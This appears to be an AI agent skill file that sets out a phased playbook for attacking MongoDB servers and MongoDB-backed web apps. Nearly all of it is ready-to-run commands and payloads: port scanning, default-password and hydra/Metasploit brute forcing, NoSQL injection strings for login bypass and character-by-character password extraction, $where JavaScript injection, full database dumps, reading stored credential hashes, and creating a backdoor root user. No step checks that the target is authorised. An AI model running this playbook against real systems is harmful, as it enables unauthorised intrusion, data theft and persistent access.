---
name: mongodb-attack
description: "MongoDB unauthorized access and NoSQL injection exploitation. Use when a target exposes port 27017, the MongoDB service has no authentication, a web application backed by MongoDB is suspected of NoSQL injection, or you need to extract data from MongoDB. Covers unauthorized access, database enumeration and dumping, NoSQL injection ($ne/$regex/$where/blind injection), JavaScript execution (mapReduce/eval), privilege escalation, GridFS file extraction, and configuration file credentials"
zh-signals: "利用 MongoDB 未授权访问与 NoSQL 注入，涵盖数据库枚举、导出、JS 执行与提权。信号:MongoDB,未授权访问,NoSQL注入,27017,数据导出"
when-to-use: "Use when a target exposes MongoDB on port 27017 without authentication, or a MongoDB-backed web app is suspected of NoSQL injection, and you need to enumerate or extract data."
metadata:
  tags: "mongodb,mongo,27017,nosql,nosql-injection,$ne,$regex,$where,mapreduce,gridfs,unauthorized,mongodump"
  category: "exploit"
---

# MongoDB Unauthorized Access and NoSQL Injection Exploitation

MongoDB listens on port 27017 by default and early versions require no authentication, so a network-exposed instance risks full data leakage. At the same time, web applications using MongoDB are widely affected by NoSQL injection vulnerabilities.

## ⛔ Further Reading (Must Read)
- Full exploitation commands and payloads → read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: Service Discovery and Version Identification

### 1.1 Nmap Scan

```bash
# MongoDB information gathering script
nmap -p 27017 --script mongodb-info TARGET

# Version detection
nmap -sV -p 27017 TARGET

# Check MongoDB related ports (27017 default, 27018 shardsvr, 27019 configsvr, 28017 HTTP status page)
nmap -p 27017-27019,28017 TARGET
```

### 1.2 Manual Connection Test

```bash
# mongosh connection (recommended client for MongoDB 5.0+)
mongosh --host TARGET --port 27017

# Legacy mongo shell (MongoDB 4.x and earlier)
mongo --host TARGET --port 27017

# Quick version detection
mongosh --host TARGET --port 27017 --eval "db.version()"

# Server status
mongosh --host TARGET --port 27017 --eval "db.serverStatus()"
```

**Key Decision**:
- Connection succeeds with no authentication prompt → unauthorized access, go straight to Phase 3
- `Authentication failed` returned → authentication required, go to Phase 2
- `db.version()` → determine the version and decide which attack paths are available (eval was removed after 4.2)

---

## Phase 2: Unauthorized / Weak Credential Detection

### 2.1 Passwordless Connection Test

```bash
# Connect directly and try an operation
mongosh --host TARGET --port 27017 --eval "show dbs"
# The database list is returned successfully → no authentication
```

### 2.2 Default Credential Detection

```bash
# Common default usernames and passwords
mongosh --host TARGET --port 27017 -u admin -p admin --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u root -p root --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u admin -p password --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u admin -p 123456 --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u mongodb -p mongodb --authenticationDatabase admin
```

### 2.3 Brute Force Tools

```bash
# Hydra
hydra -L users.txt -P passwords.txt TARGET mongodb

# Nmap
nmap -p 27017 --script mongodb-brute TARGET

# Metasploit
msf> use auxiliary/scanner/mongodb/mongodb_login
msf> set RHOSTS TARGET
msf> run
```

---

## Phase 3: Attack Decision Tree

```
Connection successful?
├─ No authentication → database enumeration + full mongodump export (Phase 5)
├─ NoSQL injection in the web application
│   ├─ Authentication bypass → {"$ne": ""} / {"$regex": ".*"} (Phase 4)
│   ├─ Data extraction → $regex character-by-character blind injection (Phase 4)
│   └─ RCE → $where + JavaScript execution (Phase 4)
├─ Low-privilege access → createUser privilege escalation / grantRolesToUser
│   → read section 5 of references/attack-techniques.md
├─ eval permission available → db.eval() / mapReduce JavaScript execution
│   → read section 4 of references/attack-techniques.md
└─ Filesystem access available → GridFS file extraction / configuration file reading
    → read sections 6 and 7 of references/attack-techniques.md
```

**Preliminary Information Gathering**:

```bash
# Current user role information
mongosh --host TARGET --port 27017 --eval "db.runCommand({connectionStatus: 1})"

# Get the server configuration parameters
mongosh --host TARGET --port 27017 --eval "db.adminCommand({getCmdLineOpts: 1})"

# List all users (requires admin database privileges)
mongosh --host TARGET --port 27017 --eval "use admin; db.system.users.find().forEach(printjson)"
```

---

## Phase 4: NoSQL Injection Quick Reference

### 4.1 Authentication Bypass

```
# HTTP POST (JSON format)
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}

# URL parameter format
username[$ne]=&password[$ne]=
username=admin&password[$regex]=.*
```

### 4.2 Data Extraction ($regex blind injection pattern)

```
# Guess the password character by character
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}
...
```

### 4.3 JavaScript Injection

```
# $where condition injection
{"$where": "this.username == 'admin' && this.password == 'secret'"}

# Time-based blind injection
{"$where": "if(this.username=='admin'){sleep(5000);return true}"}
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for complete NoSQL injection payloads

---

## Phase 5: Data Export Quick Reference

### 5.1 Database Enumeration

```bash
# List all databases
mongosh --host TARGET --port 27017 --eval "db.getMongo().getDBNames()"

# List collections
mongosh --host TARGET --port 27017 --eval "use database_name; show collections"

# Count documents in a collection
mongosh --host TARGET --port 27017 --eval "use database_name; db.collection.countDocuments({})"

# Search for sensitive fields
mongosh --host TARGET --port 27017 --eval "use database_name; db.collection.find({password: {\$exists: true}})"
```

### 5.2 Full Export

```bash
# Export all databases
mongodump --host TARGET --port 27017 --out /tmp/mongodb-dump

# Export a specific database
mongodump --host TARGET --port 27017 -d database_name --out /tmp/mongodb-dump

# Export in JSON format
mongoexport --host TARGET --port 27017 -d database_name -c collection_name --out /tmp/data.json

# Export with authentication
mongodump --host TARGET --port 27017 -u admin -p password --authenticationDatabase admin --out /tmp/mongodb-dump
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete data export commands

---

## Phase 6: JavaScript Execution and Privilege Escalation

### 6.1 db.eval() (MongoDB < 4.2)

```javascript
// Execute arbitrary JavaScript (requires admin privileges)
db.eval("return db.getMongo().getDBNames()")
```

### 6.2 mapReduce JavaScript Execution

```javascript
// Execute JavaScript through mapReduce
db.collection.mapReduce(
  function() { emit(this._id, 1); },
  function(k, v) { return Array.sum(v); },
  { out: "result" }
)
```

### 6.3 Privilege Escalation Quick Reference

```javascript
// Create an administrator user
db.createUser({user: "attacker", pwd: "password", roles: [{role: "userAdminAnyDatabase", db: "admin"}]})

// Elevate the privileges of an existing user
db.grantRolesToUser("attacker", [{role: "root", db: "admin"}])
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete JavaScript execution and privilege escalation commands

---

## Tool Quick Reference

| Tool | Purpose |
|------|------|
| mongosh / mongo | MongoDB clients (mongosh is the new one, mongo is the legacy one) |
| mongodump | Full database export (BSON format) |
| mongoexport | Collection export to JSON/CSV |
| mongofiles | GridFS file operations tool |
| NoSQLMap | Automated NoSQL injection scanning and exploitation |
| nosqlinjection | Burp Suite NoSQL injection plugin |
| nmap mongodb-info | MongoDB information gathering NSE script |

---

## Notes

- MongoDB before 3.0 has no authentication by default and binds to 0.0.0.0, so exposed instances are very common
- MongoDB 3.6+ binds to localhost by default — confirm whether the instance is exposed to the public internet
- `db.eval()` was removed in MongoDB 4.2 and is unavailable on 4.2+ versions
- Watch the data volume during a full `mongodump` export — large databases can take a very long time
- The `$where` operation in NoSQL injection is very slow and may cause performance issues in production
- Accessing `system.users` in the admin database directly yields all user credential hashes
- GridFS may store a large number of binary files (images, documents) — download selectively
- The configuration file `/etc/mongod.conf` may contain the plaintext keyFile path and binding configuration
